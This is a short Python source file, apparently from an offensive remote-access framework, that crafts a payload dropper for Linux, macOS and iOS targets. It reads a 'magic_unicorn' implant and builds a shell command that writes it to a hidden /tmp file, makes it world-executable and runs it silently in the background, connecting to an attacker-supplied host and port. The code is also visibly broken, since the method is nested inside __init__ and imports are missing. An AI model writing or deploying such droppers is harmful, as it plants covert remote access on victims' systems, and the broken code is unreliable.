#!/usr/bin/env python3

class crafter:
    def __init__(self):
        self.payload_name = ".magic_unicorn"
        self.payload_path = "/tmp/" + self.payload_name
        self.target_systems = ["Linux", "macOS", "iOS"]

        def craft_payload(self, LHOST, LPORT, target_system):
            if target_system in self.target_systems:
                print(self.badges.G + "Sending "+target_system+" payload...")
                if os.path.exists("data/payload/"+target_system+"/magic_unicorn.py"):
                    f = open("data/payload/"+target_system+"/magic_unicorn.py", "rb")
                    payload = f.read()
                    f.close()
                    instructions = \
                    "cat >"+self.payload_path+";"+\
                    "chmod 777 "+self.payload_path+";"+\
                    "python3 "+self.payload_path+" "+LHOST+" "+str(LPORT)+" 2>/dev/null &\n"
                    print(self.badges.G + "Executing "+target_system+" payload...")
                    return (instructions, payload)
                else:
                    print(self.badges.E +"Failed to craft "+target_system+" payload!")
                    sys.exit()
            else:
                print(self.badges.E +"Unrecognized target system!")
                sys.exit()
